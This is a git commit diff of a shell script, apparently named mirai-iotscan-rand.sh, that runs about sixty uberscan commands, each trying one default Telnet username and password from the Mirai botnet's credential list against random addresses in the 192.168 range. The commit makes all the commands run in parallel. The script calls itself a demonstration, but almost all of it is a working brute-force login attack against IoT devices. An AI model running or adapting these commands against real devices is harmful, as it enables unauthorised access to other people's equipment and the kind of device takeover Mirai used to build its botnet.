645d6cb3193b3b4384cc9a4fbfcf9a5845ef49c4
Batch McNulty <batchmcnulty@protonmail.com>
2017-05-12 14:41:55 +0000

    fixed a bug

--- mirai-iotscan-rand.sh
+++ mirai-iotscan-rand.sh
@@ -5,68 +5,68 @@ echo "using usernames and passwords on Mirai's wordlists. It's a bit inefficient
 echo "and password gets tried. The main thing is that it finds open Telnet ports..."
 echo " "
 echo "This is for demonstration purposes - There's another one on its way that does the same thing using password files."
-echo " Wait half a minute...."
-sleep 30s
+echo " Wait a minute or press CTRL-C to cancel...."
+sleep 1m
 
-uberscan -user:root -passblank -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -passblank -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:xc3511 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:vizxv -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:888888 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:xmhdipc -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:default -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:juantech -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:123456 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:54321 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:support -pass:support -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass: -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:password -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:root -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:user -pass:user -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass: -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:pass -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:admin1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:1111 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:smcadmin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:1111 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:666666 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:password -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:klv123 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:Administrator -pass:admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:service -pass:service -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:supervisor -pass:supervisor -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:guest -pass:guest -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:guest -pass:12345 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin1 -pass:password -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:administrator -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:666666 -pass:666666 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:888888 -pass:888888 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:ubnt -pass:ubnt -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:klv1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:Zte521 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:hi3518 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:jvbzd -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:anko -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:zlxx. -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:7ujMko0vizxv -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:7ujMko0admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:system -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:ikwb -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:dreambox -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:user -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:realtek -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:root -pass:00000000 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:1111111 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:12345 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:54321 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:123456 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:7ujMko0admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:pass -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:admin -pass:meinsm -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:tech -pass:tech -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
-uberscan -user:mother -pass:fucker -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60
+uberscan -user:root -passblank -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -passblank -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:xc3511 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:vizxv -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:888888 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:xmhdipc -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:default -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:juantech -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:123456 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:54321 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:support -pass:support -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass: -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:password -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:root -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:user -pass:user -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass: -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:pass -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:admin1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:1111 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:smcadmin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:1111 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:666666 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:password -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:klv123 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:Administrator -pass:admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:service -pass:service -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:supervisor -pass:supervisor -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:guest -pass:guest -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:guest -pass:12345 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin1 -pass:password -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:administrator -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:666666 -pass:666666 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:888888 -pass:888888 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:ubnt -pass:ubnt -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:klv1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:Zte521 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:hi3518 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:jvbzd -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:anko -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:zlxx. -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:7ujMko0vizxv -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:7ujMko0admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:system -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:ikwb -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:dreambox -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:user -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:realtek -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:root -pass:00000000 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:1111111 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:12345 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:54321 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:123456 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:7ujMko0admin -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:1234 -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:pass -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:admin -pass:meinsm -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:tech -pass:tech -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
+uberscan -user:mother -pass:fucker -scantype:telnet -debug -random_ipblock:192.168 -maxmins:60 &
